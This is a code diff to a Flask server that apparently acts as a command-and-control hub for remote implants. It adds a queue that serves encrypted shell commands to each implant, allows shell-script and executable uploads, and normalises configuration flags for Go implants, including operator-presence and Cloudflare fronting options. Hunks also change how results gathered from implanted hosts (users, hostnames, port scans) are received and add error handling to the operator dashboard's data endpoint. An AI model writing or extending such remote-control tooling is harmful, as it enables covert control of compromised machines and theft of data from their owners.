@@ -1883,8 +1883,20 @@ def add_dynamic_data(data):
     """
     Agrega datos dinámicos al diccionario JSON si es necesario,
     basándose en el contenido del diccionario 'data'.
+
+    Also normalises boolean fields that Go implants expect as strings.
     """
     data['timestamp'] = 'now'
+    bool_fields_for_go_implants = [
+        'enable_c2_implant_debug',
+        'enable_https',
+        'enable_toasts',
+        'enable_operator_presence',
+        'enable_cloudflare',
+    ]
+    for field in bool_fields_for_go_implants:
+        if field in data and isinstance(data[field], bool):
+            data[field] = str(data[field])
 
     return data
 def get_client_ip():
@@ -2273,6 +2285,7 @@ app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 app.config['MAX_CONTENT_LENGTH'] = (
     int(getattr(config, "c2_max_upload_size_mb", 10) or 10) * 1024 * 1024
 )
+app.config['SESSIONS_DIR'] = os.path.realpath(BASE_DIR)
 ALLOWED_DIRECTORY = BASE_DIR
 MODEL = retModel()
 
@@ -2343,8 +2356,10 @@ if _RBAC_AVAILABLE:
     if _active_tenant_sessions and _active_tenant_sessions != 'sessions':
         SESSIONS_DIR = os.path.join(os.getcwd(), _active_tenant_sessions)
         os.makedirs(SESSIONS_DIR, exist_ok=True)
+        app.config['SESSIONS_DIR'] = os.path.realpath(SESSIONS_DIR)
 GROQ_API_KEY = config.api_key
-ALLOWED_EXTENSIONS = {'txt', 'enc', 'exe'}
+ALLOWED_EXTENSIONS = {'txt', 'enc', 'exe', 'sh'}
+app.config['ALLOWED_EXTENSIONS'] = ALLOWED_EXTENSIONS
 BINARY_HEADERS = [
     b'\x7fELF',
     b'MZ',
@@ -2732,6 +2747,19 @@ def send_command(client_id):
         encrypted_command = encrypt_data(command.encode())
         return Response(encrypted_command)
     else:
+        cmd_queue_file = os.path.join(ALLOWED_DIRECTORY, f"cmd_{client_id}.json")
+        if os.path.isfile(cmd_queue_file):
+            try:
+                with open(cmd_queue_file, "r") as f:
+                    cmds = json.load(f)
+                if cmds:
+                    command = cmds.pop(0)
+                    with open(cmd_queue_file, "w") as f:
+                        json.dump(cmds, f)
+                    encrypted_command = encrypt_data(command.encode())
+                    return Response(encrypted_command)
+            except (OSError, ValueError, json.JSONDecodeError):
+                pass
         logging.info(f"No command for client {client_id}")
         encrypted_response = encrypt_data(b'')
         return Response(encrypted_response, mimetype='application/octet-stream')
@@ -2753,12 +2781,6 @@ def receive_result(client_id):
     try:
         logging.info(f"Receiving result from client {client_id}")
         encrypted_data = request.get_data()
-        try:
-            decrypted_data = decrypt_data(encrypted_data)
-            client_id = decrypted_data.decode().strip()
-        except Exception as exc:
-            logging.warning("Failed to decrypt client data in result receive: %s", exc)
-            pass
         decrypted_data = decrypt_data(encrypted_data)
         data = json.loads(decrypted_data)
         if client_id not in connected_clients:
@@ -3521,6 +3543,27 @@ def palette_api():
 @app.route('/api/data')
 @requires_auth
 def api_data():
+    try:
+        return _api_data_inner()
+    except Exception as exc:
+        logging.error("api_data crashed: %s", exc, exc_info=True)
+        return jsonify({
+            "error": "Internal server error",
+            "connected_clients": list(connected_clients),
+            "commands_history": {},
+            "os_data": {},
+            "hostname": {},
+            "ips": {},
+            "user": {},
+            "pid": {},
+            "discovered_ips": {},
+            "result_portscan": {},
+            "result_pwd": {},
+            "results": {},
+        }), 200
+
+
+def _api_data_inner():
     path = os.getcwd()
     prompt = getprompt()
     short_urls = load_short_urls()
